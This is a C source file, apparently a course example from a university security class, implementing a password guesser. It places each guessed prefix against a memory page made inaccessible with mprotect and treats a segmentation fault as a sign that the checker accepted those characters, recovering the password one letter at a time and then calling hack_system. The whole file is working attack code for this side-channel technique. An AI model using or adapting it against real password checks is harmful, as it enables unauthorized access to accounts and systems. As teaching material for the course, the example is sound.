/*******************************************************
 CSE127 Example password guesser using memory protection

 *******************************************************/


#include <stdio.h>
#include <signal.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <setjmp.h>
#include <stdlib.h>

// include our "system" header
#include "sysapp.h"

char * buffer;
char * page_start;
int page_size;

sigjmp_buf jumpout;


void handle_SEGV(int sig_num) {
	fprintf(stderr, "SEGV\n");
	siglongjmp(jumpout, 1);
};

// given a guess and a number of characters,
// returns 1 if first numchars in string are correct
//
int digits_correct(char * candidate, int numchars) {
	char * start = page_start - numchars;
	strncpy(start, candidate, numchars);
	fprintf(stderr, "."); // use stderr to avoid buffering

	// remeber where to return
	if (sigsetjmp(jumpout, 1) == 1) 
		return 1; // we had a SEGV

	// set the segfault handling
	signal(SIGSEGV, SIG_DFL);
	signal(SIGSEGV, &handle_SEGV);

	if (check_pass(start))
		return 1; // we got passwd right

	fprintf(stderr, ".");
	// we had no SEGV
	return 0;
};

int main(int argc, char ** argv) {
	char guess[33];
	char c;
	int ok;
	int len;

	// get the physical page size
	page_size = sysconf(_SC_PAGESIZE);

	// allocate the buffer - we need at least 3 pages (because we might start at the start of page)
	//   Page:   1111111111111111222222222222222233333333333333334444444
	//              ^ buffer     ^page_start                        ^ end of buffer
    //   Prot:   ++++++++++++++++----------------+++++++++++++++++++++++
	//
	buffer = (char*)malloc(3 * page_size);
	if (!buffer) {
		perror("malloc failed");
		exit(1);
	};
	// find the page start into buffer
	page_start = buffer + (page_size - ((unsigned int)buffer)%page_size);
	// fix the page start if there is not enough space 
	if ((page_start-buffer) <= 32)
		page_start += page_size;

	printf("buffer: got 0x%X, page 0x%X, start 0x%X\n", buffer, page_size, page_start);
	
	// prohibit access to the page
	if (mprotect(page_start, page_size, PROT_NONE) == -1) {
		perror("mprotect failed");
	};

	// set guess to zeros
	bzero(guess, sizeof(guess));

	// do the guessing
	for (len=1; len<32; len++) {
		// see if we are done first..
		printf("Guessing character %d\n", len);
		if (check_pass(guess)) {
			printf("Password Found!\n");
			hack_system(guess);
		};
		ok = 0;
		for (c = 'A'; c<='Z'; c++) {
			guess[len-1] = c;
			fprintf(stderr, "%c", c);
			if (digits_correct(guess, len)) {
				ok = 1;
				break;
			};
		};
		if (!ok) {
			fprintf(stderr, "error: could not determine char %d\n", len);
			exit(2);
		};
		printf("Character %d is %c\n", len, guess[len-1]);
	};
	printf("Could not get the password!\n");
	return 1;
};
